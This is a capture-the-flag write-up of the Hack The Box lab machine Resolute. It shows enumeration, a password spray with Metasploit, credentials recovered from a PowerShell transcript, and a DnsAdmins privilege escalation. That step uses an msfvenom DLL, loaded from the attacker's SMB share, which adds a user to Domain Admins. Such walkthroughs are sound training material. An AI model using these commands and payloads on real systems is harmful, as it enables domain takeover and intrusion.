---
title: "[HTB] Resolute WriteUp"
date: 2020-05-30T15:34:30-04:00
categories:
  - Hack The Box
excerpt: "Lets start by running nmap. There is no website running on port 80, this machine is going to be entirely Active Directory."
header:
  teaser: "/assets/resolute/resolute.jpg"
tags:
  - HTB
  - Resolute
  - Hack The Box
  - WriteUp
---

![Resolute]({{ site.url }}{{ site.baseurl }}/assets/resolute/resolute.jpg)

* OS: Windows
* Difficulty: Medium
* Points: 30
* Release: 07 Dec 2019
* IP: 10.10.10.169

Lets start by running nmap 

```bash
nmap -sC -sV -oN nmap/nmap 10.10.10.169
```

Output:

```
Nmap scan report for 10.10.10.169
Host is up (0.029s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-21 19:35:50Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/21%Time=5EC6D580%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h31m07s, deviation: 4h02m30s, median: 11m06s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-05-21T12:36:03-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-05-21T19:36:05
|_  start_date: 2020-05-21T19:32:42

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 21 20:26:33 2020 -- 1 IP address (1 host up) scanned in 117.39 seconds

```

There is no website running on port 80, this machine is going to be entirely Active Directory. It looks like the machine is an Active Directory Domain controller. 

Let's continue enumerating. Use enum4linux to gather more info from the machine.

```bash
enum4linux 10.10.10.169


Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu May 21 20:35:17 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.169
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================= 
|    Users on 10.10.10.169    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)


```

enum4linux generates a lot of information. Under `Users` we find an interesting description for the user Marko: 

> Desc: Account created. Password set to Welcome123!

If we try logging into the SMB service as Marko it fails. We can assume that Welcome123! is used as a default password by a lazy admin, so lets try it against all of the users. An easy way to do this is to use the auxiliary/scanner/smb/smb_login module in metasploit.

```bash
msf5 > use auxiliary/scanner/smb/smb_login

[*] 10.10.10.169:445      - 10.10.10.169:445 - Starting SMB login bruteforce
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\userlist::Welcome123!',
[!] 10.10.10.169:445      - No active DB -- Credential data will not be saved!
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\Administrator:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\Guest:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\krbtgt:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\DefaultAccount:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\ryan:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\marko:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\sunita:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\abigail:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\marcus:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\sally:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\fred:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\angela:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\felicia:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\gustavo:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\ulf:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\stevie:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\claire:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\paulo:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\steve:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\annette:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\annika:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\per:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\claude:Welcome123!',
[+] 10.10.10.169:445      - 10.10.10.169:445 - Success: 'megabank\melanie:Welcome123!'
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\zach:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\simon:Welcome123!',
[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'megabank\naoki:Welcome123!',
[*] 10.10.10.169:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We get a hit! The user Melanie is using the default password.

We can now use ldapdomaindump as an authenticated user to learn more about the system. 

```bash
❯ ldapdomaindump -u megabank\melanie 10.10.10.169
Password: 
[] Connecting to host...
[] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

This outputs a number of files, the USER file gives us more info about the users and which groups they are members of.
Melanie is in the Remote Management Users group, which means we should be able to use evil-winrm to login as Melanie. Also of interest is the user ryan who is a member of the Contractors group, which is in turn a member of DnsAdmins and Remote Management Users.

Lets login as Melanie.

```bash
evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
```

Navigate to C:\Users\Melanie\Desktop\user.txt for the user flag.

### PrivEsc

I tried running winPEAS but this didn't return anything useful.
After looking around the filesystem I eventually found a hidden directory C:\PSTranscripts
To see hidden files in Powershell use:

```bash
Get-ChildItem -Force
```

In this directory there is a log file:

```
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

A number of lines contain a password Serv3r4Admin4cc123! associated with the ryan user account.
We already know from ldapdomaindump that ryan is a member of Remote Management Users, so lets log in as ryan.
We also know that ryan is a member of DnsAdmins, meaning that ryan has access to the dnscmd command. We can use this to get root access by injecting a malicious dns.dll

Our dns.dll file will be run with admin privileges so we could use a reverse shell, however i found that this was not stable, perhaps due to windows defender. Another option is to add a user to the Domain Admins group. 
So lets use msfvenom to craft a malicious dns.dll that will add melanie to Domain Admins.

```bash
msfvenom -p windows/x64/exec CMD='net group "domain admins" melanie /add /domain' -f dll > dns.dll
```

Windows Defender removes the file if you transfer it to the local machine so we will have to host it on a SMB share.

```bash
smbserver.py -debug smb ./
```

Now as ryan we can run the following command to change the serverlevelplugindll to our malicious file.

```bash
dnscmd RESOLUTE /config /serverlevelplugindll \\10.10.14.35\\smb\\dns.dll 
```

Then we must restart dns for our code to be run.

```bash
sc.exe stop dns

sc.exe start dns
```

If all has gone well melanie should now be a member of the Domain Admins group. If we log back in as melanie we can read the root.txt flag

```
melanie: cat C:/Users/Administrator/Desktop/root.txt
```

